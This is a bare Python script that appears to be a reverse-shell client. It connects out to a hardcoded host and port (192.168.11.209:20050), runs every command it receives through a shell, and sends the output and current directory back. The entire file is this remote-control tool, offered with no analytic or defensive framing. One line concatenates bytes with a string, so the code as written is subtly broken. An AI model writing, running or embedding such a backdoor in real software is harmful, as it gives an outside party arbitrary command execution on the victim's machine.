import socket
import os
import subprocess


def create_socket():
    sock = socket.socket()
    host = "192.168.11.209"
    port = 20050
    return sock, host, port


def receive_commands(sock, host, port):
    while True:
        data = sock.recv(1024)
        if data[:2].decode('utf-8') == 'cd':
            path = data[3:].decode('utf-8')
            os.chdir(path)
        if len(data) > 2:
            cmd = subprocess.Popen(data.decode('utf-8'), shell=True, stderr=subprocess.PIPE,
                                   stdout=subprocess.PIPE, stdin=subprocess.PIPE)
            output_byte = cmd.stdout.read() + ' ' + cmd.stderr.read()
            output_str = str(output_byte, 'utf-8')
            working_directory = os.getcwd() + '> '
            to_send = str.encode(working_directory + output_str)
            sock.send(to_send)


def main():
    sock, host, port = create_socket()
    sock.connect((host, port))
    receive_commands(sock, host, port)


main()